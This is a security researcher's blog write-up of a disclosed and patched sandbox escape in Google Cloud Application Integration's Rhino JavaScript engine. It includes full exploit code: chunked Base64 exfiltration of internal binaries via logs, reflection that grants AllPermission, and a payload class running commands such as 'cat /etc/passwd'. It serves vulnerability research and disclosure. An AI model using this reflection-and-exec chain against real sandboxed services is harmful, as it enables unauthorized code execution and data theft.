---
layout: post
title: "Escaping Google Cloud Application Integration Sandbox: Straight into Borg"
tag:
- sandbox-escape
- rce
- gcp
- cve
- java
- rhino
- bug-bounty
---


## Introduction

This post details my discovery and exploitation of a sandbox escape vulnerability in Google Cloud's Application Integration service. The vulnerability, assigned CVE-2025-0982, allowed complete sandbox escape and arbitrary command execution within Google's Borg infrastructure. 

Google mitigated the issue within 48 hours of my report and moved Application Integration off Rhino entirely: new JavaScript tasks switched to the V8 engine in January 2025, and Rhino was fully deprecated and blocked on March 30, 2026. Google published a security bulletin for the issue as [GCP-2026-044](https://docs.cloud.google.com/application-integration/docs/security-bulletins). The vulnerability was rewarded with a $75,000 bounty through Google's Vulnerability Reward Program.

## Target: Google Cloud Application Integration

Google Cloud Application Integration is an Integration Platform as a Service (iPaaS) that helps organizations connect and manage different cloud applications and services. What made it an interesting target from a security research perspective is that it's described as a fully managed service. That phrasing caught my attention - if Google runs the execution environment itself, a vulnerability might impact Google's own infrastructure rather than just customer-deployed resources. To be clear, this is rarely the case: most Google Cloud services isolate customer workloads in a dedicated tenant project.

The service includes a JavaScript task feature that allows customers to write and execute JavaScript code to handle various integration workflows. This JavaScript execution was powered by Rhino - an open-source JavaScript engine written entirely in Java.

The interesting security aspect of Rhino is that it has the capability to directly access Java packages and execute Java code from within JavaScript scripts. This is powerful functionality, but it requires careful sandboxing to prevent misuse. This became my research focus: understanding and testing the security boundaries of this JavaScript execution environment.

## Initial Discovery Phase

### Testing Java Access

I started my research by testing what level of Java access was available from the JavaScript environment. My first approach was direct - trying to create a URL object and make a network connection:

```javascript
var url = new java.net.URL("https://www.google.com");
var connection = url.openConnection();
```

The error I received was interesting. Instead of a standard Java SecurityException, I got a TypeError stating that **"JavaPackage java.net.URL is not a function, it is object."** After experimenting more with accessing Rhino classes, I realized this was Rhino's specific error message when Java package access is restricted.

Next, I tried the same approach just using Java reflection:

```javascript
var urlClass = java.lang.Class.forName("java.net.URL");
var urlConstructor = urlClass.getConstructor([java.lang.String]);
```

This time I got a proper `SecurityException`, but the error message was revealing:

```
java.lang.SecurityException: Thread sandboxed by 
com.google.enterprise.crm.eventbus.inlinescript.security.JavaScriptPermissionChecker 
caused security violation: ("java.lang.RuntimePermission" "accessClassInPackage.java.net")
```

This error message gave me my first real clue about the sandbox implementation - there was a custom class called `JavaScriptPermissionChecker` managing security decisions.

### Environment Reconnaissance

I shifted focus to understanding the environment I was running in. By examining Java system properties, I discovered something interesting:

```javascript
var properties = java.lang.System.getProperties();
```

```
System Properties: java.vm.name = OpenJDK 64-Bit Server VM
java.vm.vendor = Google Inc. 
java.vm.version = 21.0.5+-google-release-700918988 
java.vm.info = mixed mode, sharing 
java.runtime.version = 21.0.5+-google-release-700918988 
os.name = Linux os.version = 5.10.0-smp-1105.32.0.0 
os.arch = amd64 
user.name = cloud-crm-ip-script-execution 
user.dir = /export/hda3/borglet/local_ram_fs_dirs/77.prod_europe_central2.javascript_execution_service.cloud-crm-ip-script-execution.218880700390.5c10541128e1b51f 
file.separator = / 
path.separator = : 
```

The paths contained references to "borglet" and showed the code was running in a JavaScript execution service. Borg is Google's internal cluster management system, and borglet is the per-machine agent that executes tasks. This confirmed I was operating within Google's core infrastructure, making any security implications more significant.

I also tested file system access and discovered I could access the current working directory. The directory listing revealed internal configuration files and two particularly large .jar files:
```
deploy_pkg/
  JavaScriptExecutionServer_deploy.jar (395514.89KB)
<...>
tmp/
    env.boot.1736861544.780990.2123943.d/
    gRuntime/
    hsperfdata_cloud-crm-ip-script-execution/
    initgoogle_syslog_dir.368901133/
    JavaScriptRunner_tmp.jar (145849.22KB)
```

These files likely contained the sandbox implementation code I needed to study. The challenge now was: how do I get these files out?

## Challenge 1: Exfiltrating the Binaries

So I had found these two large JAR files that likely contained the sandbox implementation code. The problem was getting them out of the environment.

Through my earlier testing, I already knew that all network functions were blocked - both Java and JavaScript couldn't make any outbound connections. The only channel I had for extracting data was the `event.log()` JavaScript function, which writes to the execution logs that I could later view in the Google Cloud console.
 But the log output was restricted to approximately 10MB per execution. The files I needed to extract totaled around 500MB.
![event.log()](/assets/app-integration-sandbox/eventlog.png)

I would have to extract the files in pieces and reassemble them offline. Here's the approach I settled on:

1. Read the file in chunks of about 5MB, sized so that each chunk encodes to just under 7MB of Base64
2. Convert each binary chunk to Base64 text
3. Output the Base64 text via `event.log()`
4. Run the script multiple times with different offsets to capture all segments
5. Combine the logged Base64 strings offline and decode them to reconstruct the original file

The code looked something like this:

```javascript
function executeScript(event) {
    try {
        // Path is relative to user.dir, the Borglet working directory listed above
        var binFile = new java.io.File("tmp/JavaScriptRunner_tmp.jar");
        
        var chunkNum = 28; // Change this value for each execution to get different chunks
        var CHUNK_SIZE = Math.floor(7 * 1024 * 1024 / 1.34); // ~5.2MB to stay under 10MB after base64
        
        var fis = new java.io.FileInputStream(binFile);
        var buffer = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, CHUNK_SIZE);
        var bytesRead;
        var currentChunk = 0;
        
        // Skip to requested chunk
        while(currentChunk < chunkNum && (bytesRead = fis.read(buffer)) > -1) {
            currentChunk++;
        }
        
        // Read and output requested chunk
        bytesRead = fis.read(buffer);
        if(bytesRead > -1) {
            var chunk = java.util.Arrays.copyOf(buffer, bytesRead);
            var base64 = java.util.Base64.getEncoder().encodeToString(chunk);
            event.log(base64);
        }
        
        fis.close();
    } catch (err) {
        event.log("Error: " + err);
    }
}
```

By changing the chunkNum value and running the script repeatedly, I eventually captured all segments and reassembled both JAR files on my local machine.

## Challenge 2: Extracting Java Classes from ELF Binaries

### The Surprise

After reconstructing the files, I ran the `file` command to verify what I had:

```bash
$ file JavaScriptExecutionServer_deploy.jar
JavaScriptExecutionServer_deploy.jar: ELF 64-bit LSB pie executable, x86-64, 
dynamically linked, interpreter /usr/grte/v5/lib64/ld-linux-x86-64.so.2
```

These weren't JAR files at all - they were ELF binaries. This presented a new challenge: how to extract the Java classes I suspected were embedded within these executables.

I went down a bit of a rabbit hole here, trying various manual approaches to locate and extract the embedded class files. During my BSides Vilnius presentation I walked through the whole semi-manual process involving hex editors and custom Python scripts. But the reality is simpler: binwalk was able to extract the class files from the binary all along - I had just been misusing it initially.

Once I had the extracted class files, I ran them through a Java decompiler and finally had access to the complete source code of Google's sandbox implementation. This was the breakthrough I needed.

![Decompiled code](/assets/app-integration-sandbox/sourcecode.png)




## Challenge 3: Understanding the Sandbox Architecture

With the decompiled source code available, I began analyzing how the JavaScript sandbox was implemented. Understanding this architecture was crucial for finding a way to escape it.

### Java Security Manager Basics

First, a quick primer on Java Security Manager, which forms the foundation of the sandbox:

The Security Manager is a core Java security feature that allows defining and enforcing fine-grained security rules. It acts as a central gatekeeper for potentially sensitive operations like file access, network connections, reflection, and process execution.

When code attempts a sensitive operation, the core Java libraries consult the Security Manager before allowing it to proceed. The Security Manager's `checkPermission(Permission perm)` method is called, which evaluates the requested Permission object against the current security policy.

The security policy defines which permissions are granted to which code, traditionally configured via a `.policy` file or set programmatically. If the policy grants the requested permission, the operation continues. If not, a `SecurityException` is thrown.

A sample security policy might look like:

```java
grant codeBase "file:/opt/application/*" {
    permission java.io.FilePermission "/app/data/*", "read,write";
    permission java.net.SocketPermission "db.internal.example.com:5432", "connect";
    permission java.lang.reflect.ReflectPermission "suppressAccessChecks";
};
```

### Google's Implementation

The decompiled code revealed how the sandbox is put together. Walking through it from server startup, there are five steps:

#### Step 1: Server Initialization

The `JavaScriptExecutionServer` class initializes the sandbox when the server starts:

```java
if ((Boolean)enableSandbox.get()) {
   SandboxingGoogleSecurityManager javascriptSecurityManager = JavaScriptSecurityManager.createSecurityManager();
   System.setSecurityManager(javascriptSecurityManager);
}
```

This creates a custom security manager and sets it as the system's security manager. Every security check in Java will now go through this manager.

#### Step 2: Script Execution

When JavaScript code is executed, a new `JavaScriptPermissionChecker` is created for each execution and the script is run inside a confined block:

```java
JavaScriptPermissionChecker sandbox = new JavaScriptPermissionChecker();
Object resultObject = sandbox.runConfinedNoExceptions(new ConfinedRunnableNoException<Object>() {
    public Object run() {
        JavaScript script = JavaScript.create(request.getScript(), scope, mainScript);
        return script.executeJavaScript(arguments);
    }
});
```

The `runConfinedNoExceptions` method is critical for security - it marks the current thread as untrusted for the duration of the script:

```java
public final <T> T runConfinedNoExceptions(ConfinedRunnables.ConfinedRunnableNoException<T> runnable) {
   Preconditions.checkArgument(
      System.getSecurityManager() instanceof com.google.security.manager.SandboxingGoogleSecurityManager,
      "Current security manager isn't SandboxingGoogleSecurityManager: %s",
      System.getSecurityManager()
   );
   com.google.security.manager.SandboxingGoogleSecurityManager sandbox = (com.google.security.manager.SandboxingGoogleSecurityManager)System.getSecurityManager();
   sandbox.markCurrentThreadAsUntrusted(this);

   Object var3;
   try {
      var3 = runnable.run();
   } finally {
      sandbox.markCurrentThreadAsTrusted();
   }

   return (T)var3;
}
```

#### Step 3: Thread-Based Security Tracking

The `SandboxingGoogleSecurityManager` tracks which threads are trusted:

```java
private void delegateToPermissionChecker(Permission perm) {
   PermissionChecker checker = threadPermissionChecker.get();
   if (checker != null && !checker.isAllowed(perm)) {
      this.sandboxedViolationsCounter.increment();
      String errorMsg = "Thread sandboxed by " + checker + " caused security violation: " + perm;
      throw new SecurityException(errorMsg);
   }
}
```

Trusted threads (where `checker == null`) proceed normally. Untrusted threads must pass additional permission checks through the `JavaScriptPermissionChecker`.

#### Step 4: Two Layers of Checks

Google didn't use the stock Java Security Manager here. They extended it, and the extension is what decides how far an escape can get.

It comes in two parts: `GoogleSecurityManager`, which enforces a server-wide policy, and `SandboxingGoogleSecurityManager`, which builds on it to confine individual threads.

`GoogleSecurityManager` carries a `SecurityPolicy` that is configured once at server startup - in this case `TaskSecurityPolicy`. Rather than a traditional `.policy` file keyed on where code was loaded from, it holds path-based rules: which directories can be read, written, deleted or executed. This policy covers every thread in the process.

`SandboxingGoogleSecurityManager` adds the per-thread confinement from Step 3 - the ability to mark a single thread as untrusted and attach a `PermissionChecker` to it, so a script can be restricted without changing the rules for the rest of the server.

The important part is that these two layers don't apply to everything equally.

For file operations - reads, writes, deletes and process execution - the policy is consulted first. Only if it allows the operation does the request reach the thread's `PermissionChecker`.

For everything else - package access, socket connections, thread and classloader operations - `GoogleSecurityManager` doesn't check anything, and the thread's `PermissionChecker` is the only thing in the way.

That checker is `JavaScriptPermissionChecker`:

```java
public boolean isAllowed(Permission perm) {
   return COMMON_PERMISSIONS.implies(perm)
      ? true
      : (perm instanceof FilePermission || perm instanceof SocketPermission || perm instanceof RuntimePermission)
         && TaskSecurityPolicy.getInstance().isAllowed(perm);
}
```

`isAllowed` answers in one of three ways:

- **`COMMON_PERMISSIONS`** - a fixed set of permissions defined in code. It lists the basic abilities every script always gets: reflection via `suppressAccessChecks`, access to a handful of packages, and so on. If it covers the permission, the answer is yes and nothing else is consulted.
- **A hard deny** - anything that isn't a `FilePermission`, `SocketPermission` or `RuntimePermission` is refused outright. That's why `suppressAccessChecks` had to be named in the list explicitly: as a `ReflectPermission` it would otherwise never get through, and Rhino would stop working.
- **`TaskSecurityPolicy`** - for the three types that do get through, the same policy from the first layer makes the final call.


#### Step 5: The Security Policy

This is the policy layer from Step 4. The `DefaultSecurityRules` class is what populates it at startup - for example, `addTmpDirPermissions` grants access to temporary directories:

```java
public static void addTmpDirPermissions(com.google.security.manager.SecurityPolicy policy, String tempDir) {
   // ... permissions for the configured tempDir ...

   policy.addPath("/tmp", com.google.security.manager.FileOperation.READ, com.google.security.manager.FileOperation.WRITE);
   policy.addPath(
      "/tmp/-",
      com.google.security.manager.FileOperation.READ,
      com.google.security.manager.FileOperation.WRITE,
      com.google.security.manager.FileOperation.DELETE
   );
   // ... plus equivalent grants for /export/hda3/tmp ...
}
```

Each `addPath` call takes a path followed by the granted `FileOperation`s. The `/tmp/-` form is the recursive variant (`/-` is the security-manager wildcard for everything under the directory), so reads and writes are allowed at `/tmp` itself and reads/writes/deletes recursively beneath it.

## The Vulnerability: Two Misconfigurations

While working through these steps, I identified two issues that, when combined, enabled a complete sandbox escape.

### Issue #1: The suppressAccessChecks Permission

In the `JavaScriptPermissionChecker` class, I found the `COMMON_PERMISSIONS` configuration:

```java
private static Permissions createCommonPermissions() {
   Permissions permissions = new Permissions();
   permissions.add(accessClassInPackage("com.google.apps.framework.request"));
   permissions.add(accessClassInPackage("com.google.common.base"));
   permissions.add(accessClassInPackage("com.google.enterprise.crm.exceptions"));
   permissions.add(accessClassInPackage("com.google.net.util.error"));
   permissions.add(accessClassInPackage("com.google.protobuf"));
   permissions.add(accessClassInPackage("com.google.common.collect"));
   permissions.add(accessClassInPackage("java.lang"));
   permissions.add(accessClassInPackage("java.lang.*"));
   permissions.add(accessClassInPackage("java.text"));
   permissions.add(accessClassInPackage("java.util"));
   permissions.add(accessClassInPackage("java.util.regex"));
   permissions.add(accessClassInPackage("org.mozilla.javascript"));
   permissions.add(accessClassInPackage("org.mozilla.javascript.*"));
   permissions.add(accessClassInPackage("org.w3c.dom"));
   permissions.add(accessClassInPackage("org.xml.sax"));
   permissions.add(accessClassInPackage("javax.xml.*"));
   permissions.add(accessClassInPackage("java.io"));
   permissions.add(accessClassInPackage("jdk.internal.reflect"));
   permissions.add(accessClassInPackage("java.security"));
   permissions.add(new RuntimePermission("createClassLoader"));
   permissions.add(new RuntimePermission("getClassLoader"));
   permissions.add(new RuntimePermission("getProtectionDomain"));
   permissions.add(new ReflectPermission("suppressAccessChecks"));
   return permissions;
}

protected static RuntimePermission accessClassInPackage(String packageName) {
   return new RuntimePermission("accessClassInPackage." + packageName);
}
```

The `suppressAccessChecks` permission lets code bypass Java's access control mechanisms through reflection. With this permission, code can:

- Access and modify private fields of any class
- Call private methods
- Bypass final modifiers
- Modify security-critical internal state

This permission was likely added to support Rhino's JavaScript functionality, but it opened a security hole. Since `COMMON_PERMISSIONS` is stored in a static field, and I have the ability to access and modify it through reflection, I could add any permissions I needed.

### Issue #2: Java Binary Execution Permission

The `JavaScriptSecurityManager.createSecurityManager()` method granted one more permission:

```java
public static SandboxingGoogleSecurityManager createSecurityManager() {
   return createSecurityManager(false);
}

private static SandboxingGoogleSecurityManager createSecurityManager(boolean allowUninstall) {
   // ... throws if a security manager is already installed ...
   SecurityPolicy securityPolicy = TaskSecurityPolicy.getInstance();

   // ... grants for tmp dirs, /proc, dev nodes, JAVA_HOME/lib, etc. ...

   securityPolicy.addPath(PathUtil.join(new String[]{StandardSystemProperty.JAVA_HOME.value(), "bin/java"}), new FileOperation[]{FileOperation.EXEC});
   SandboxingGoogleSecurityManagerBuilder builder = new SandboxingGoogleSecurityManagerBuilder().withSecurityPolicy(securityPolicy);
   return builder.build();
}
```

The key line grants `FileOperation.EXEC` on `$JAVA_HOME/bin/java`, allowing execution of the Java binary. While this was probably added for legitimate functionality (perhaps to spawn Java processes for certain operations), it became a component of my exploit chain.


## Building the Exploit Chain

With my understanding of the sandbox architecture and its weaknesses, I could now build a complete exploitation chain.

### The Strategy

The exploit works in three steps:

1. Use `suppressAccessChecks` to modify `COMMON_PERMISSIONS` and grant additional capabilities
2. Write a malicious Java class to `/tmp` (we already have write permission)
3. Execute that class using `$JAVA_HOME/bin/java` (we already have execute permission)


### Step 1: Modifying Security Permissions

First, I used reflection to access and modify the private `COMMON_PERMISSIONS` field:

```javascript
var jsCheckerClass = java.lang.Class.forName(
    "com.google.enterprise.crm.eventbus.inlinescript.security.JavaScriptPermissionChecker"
);

var permissionsField = jsCheckerClass.getDeclaredField("COMMON_PERMISSIONS");
permissionsField.setAccessible(true);
var permissions = permissionsField.get(null);

event.log("Initial permissions state: " + permissions);

// Add the permissions we need
permissions.add(new java.lang.RuntimePermission("modifyThread"));
permissions.add(new java.security.AllPermission());
```

The `suppressAccessChecks` permission that already exists in `COMMON_PERMISSIONS` allows me to call `setAccessible(true)` on the field, bypassing the private access modifier.

Adding `AllPermission` makes `COMMON_PERMISSIONS.implies` return true for everything, so `isAllowed` always takes its first branch. For my script's thread, the `PermissionChecker` is now effectively switched off.

That is less than it sounds. It only removes one of the two layers. `TaskSecurityPolicy` is still enforced on every file read, write, delete and exec, and nothing I did to `COMMON_PERMISSIONS` touches it. I still couldn't write outside the directories the policy allowed, and I still couldn't execute anything it hadn't already granted. Giving myself every permission did not, on its own, get me command execution.

What it did get me was the runtime permissions. Starting a process isn't just a fork and exec - the JVM also spins up an internal background thread that waits for the child to exit and collects its exit code. Creating that thread needs `modifyThread` and `modifyThreadGroup`, and those go through the `PermissionChecker` alone - where `TaskSecurityPolicy` has no runtime permission grants at all.

So the shape of the exploit was decided for me: write to `/tmp`, execute `$JAVA_HOME/bin/java`, and use `AllPermission` to clear the thread checks standing between me and `ProcessBuilder`.

### Step 2: Writing the Payload Class

Next, I needed to write my payload Java class to the filesystem. I created a simple class that executes system commands and writes their output to a file:

```java
import java.io.BufferedReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;

public class ExecuteCommands {

    public static void main(String[] args) {
        // Commands to be executed
        String[] commands = {"hostname", "id", "cat /etc/passwd"};

        // Output file
        String outputFile = "/tmp/result.txt";

        try (FileWriter writer = new FileWriter(outputFile)) {
            for (String command : commands) {
                executeCommand(command, writer);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private static void executeCommand(String command, FileWriter writer) throws IOException {
        ProcessBuilder processBuilder = new ProcessBuilder("sh", "-c", command);
        processBuilder.redirectErrorStream(true); // Redirect stderr to stdout

        Process process = processBuilder.start();
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
            String line;
            while ((line = reader.readLine()) != null) {
                writer.write(line + "\n");
            }
        }

        try {
            int exitCode = process.waitFor();
            writer.write("Command: " + command + " exited with code: " + exitCode + "\n");
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            writer.write("Command: " + command + " was interrupted\n");
        }
    }
}
```

I compiled this class on my local machine, then transferred it to the target system. Since I'm transferring a binary file through JavaScript, I Base64-encoded it first:

```javascript
// Hardcoded Base64 encoded content of the ExecuteCommands.class file
var base64Content = "yv66vgAAAE...";

// Decode the Base64 content
var decodedBytes = java.util.Base64.getDecoder().decode(base64Content);

// Write to /tmp
var outputFile = new java.io.File("/tmp/ExecuteCommands.class");
var outputStream = new java.io.FileOutputStream(outputFile);
outputStream.write(decodedBytes);
outputStream.close();
```

The `DefaultSecurityRules` already grant write access to `/tmp`, so this operation succeeds without requiring any additional permissions.

### Step 3: Executing the Java Binary

Finally, I executed my class using the Java binary:

```javascript
var javaPath = new java.io.File(java.lang.System.getProperty("java.home"), "bin/java");

// Execute the class file
var processBuilder = new java.lang.ProcessBuilder(
    javaPath.getAbsolutePath(), 
    "-cp", 
    "/tmp", 
    "ExecuteCommands"
);
processBuilder.redirectErrorStream(true);
var process = processBuilder.start();
process.waitFor();

// Read the results
var resultFile = new java.io.File("/tmp/result.txt");
if (resultFile.exists()) {
    var resultReader = new java.io.BufferedReader(
        new java.io.FileReader(resultFile)
    );
    var resultContent = "";
    var line;
    while ((line = resultReader.readLine()) != null) {
        resultContent += line + "\n";
    }
    resultReader.close();
    event.log("Result File Content:\n" + resultContent);
}
```

The `JavaScriptSecurityManager` explicitly allows execution of the Java binary, so this operation succeeds. Critically, when `$JAVA_HOME/bin/java` spawns a new Java process to run my class, it runs as a completely separate process outside the sandbox restrictions.

The commands execute with the service account's privileges within the Borglet environment, and I can verify success by reading the output file from `/tmp` and writing it to the execution logs.

<div class="video-embed">
<iframe src="https://www.youtube.com/embed/0FfnrL28M_4" frameborder="0" allowfullscreen></iframe>
</div>

### Disclosure and Response

I reported the vulnerability to Google's Vulnerability Reward Program (VRP). The response was impressively quick:

**Timeline:**
- **Jan 22, 2025, 11:17 PM** - Reported the vulnerability to Google's VRP
- **Jan 23, 2025, 12:12 PM** - Google triaged the report, marked it as P0/S0 ("Nice catch!")
- **Jan 24, 2025** - New JavaScript tasks switched to the V8 engine
- **Jan 29, 2025, 10:46 PM** - Marked as fixed by disabling Rhino (Google noted the issue was mitigated within 48 hours of the report)
- **Jan 30, 2025, 08:54 PM** - $75,000 bounty awarded. Rationale for this decision: This report was of exceptional quality! Vulnerability category is "Breach of Google Cloud's production environment". Vulnerabilities without any interaction or relationship between attacker and victim. Default Google Cloud products.
- **Mar 30, 2026** - Rhino fully deprecated and blocked; pre-2025 integrations required migration
- **Jun 25, 2026** - Google published security bulletin GCP-2026-044


**Keep hacking!**
